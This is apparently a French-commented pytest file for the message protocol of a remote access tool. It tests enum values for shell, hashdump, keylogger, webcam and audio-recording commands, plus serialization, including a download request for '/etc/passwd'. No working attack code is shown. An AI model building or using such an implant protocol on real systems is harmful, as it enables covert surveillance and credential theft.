"""Tests unitaires pour le module protocol."""

import pytest

from common.protocol import Message, MessageType


class TestMessageType:
    """Tests de l'énumération MessageType."""

    def test_values(self):
        """Vérifie que tous les types requis sont présents."""
        assert MessageType.CMD_HELP.value == "help"
        assert MessageType.CMD_DOWNLOAD.value == "download"
        assert MessageType.CMD_UPLOAD.value == "upload"
        assert MessageType.CMD_SHELL.value == "shell"
        assert MessageType.CMD_IPCONFIG.value == "ipconfig"
        assert MessageType.CMD_SCREENSHOT.value == "screenshot"
        assert MessageType.CMD_SEARCH.value == "search"
        assert MessageType.CMD_HASHDUMP.value == "hashdump"
        assert MessageType.CMD_KEYLOGGER_START.value == "keylogger_start"
        assert MessageType.CMD_KEYLOGGER_STOP.value == "keylogger_stop"
        assert MessageType.CMD_KEYLOGGER_GET.value == "keylogger_get"
        assert MessageType.CMD_WEBCAM_SNAPSHOT.value == "webcam_snapshot"
        assert MessageType.CMD_WEBCAM_STREAM_START.value == "webcam_stream_start"
        assert MessageType.CMD_WEBCAM_STREAM_STOP.value == "webcam_stream_stop"
        assert MessageType.CMD_RECORD_AUDIO_START.value == "record_audio_start"
        assert MessageType.CMD_RECORD_AUDIO_STOP.value == "record_audio_stop"

        # Réponses
        assert MessageType.RESP_OK.value == "ok"
        assert MessageType.RESP_ERROR.value == "error"
        assert MessageType.RESP_DATA.value == "data"
        assert MessageType.RESP_FILE.value == "file"


class TestMessage:
    """Tests de la classe Message."""

    def test_create_simple(self):
        """Test la création d'un message simple."""
        msg = Message(MessageType.CMD_HELP)
        assert msg.type == MessageType.CMD_HELP
        assert msg.payload == {}

    def test_create_with_payload(self):
        """Test la création avec payload."""
        msg = Message(MessageType.CMD_DOWNLOAD, path="/etc/passwd")
        assert msg.type == MessageType.CMD_DOWNLOAD
        assert msg.payload["path"] == "/etc/passwd"

    def test_to_bytes(self):
        """Test la sérialisation en bytes."""
        msg = Message(MessageType.RESP_OK, output="test")
        data = msg.to_bytes()
        assert isinstance(data, bytes)

        # Désérialiser pour vérifier
        import json
        obj = json.loads(data.decode("utf-8"))
        assert obj["type"] == "ok"
        assert obj["payload"]["output"] == "test"

    def test_from_bytes(self):
        """Test la désérialisation depuis bytes."""
        original = Message(MessageType.CMD_SCREENSHOT)
        data = original.to_bytes()
        restored = Message.from_bytes(data)

        assert restored.type == MessageType.CMD_SCREENSHOT
        assert restored.payload == {}

    def test_roundtrip(self):
        """Test un cycle complet sérialisation/désérialisation."""
        original = Message(
            MessageType.CMD_SEARCH,
            pattern="*.txt",
            base_dir="/home",
        )
        data = original.to_bytes()
        restored = Message.from_bytes(data)

        assert original.type == restored.type
        assert original.payload == restored.payload

    def test_repr(self):
        """Test la représentation string."""
        msg = Message(MessageType.CMD_HELP)
        repr_str = repr(msg)
        assert "help" in repr_str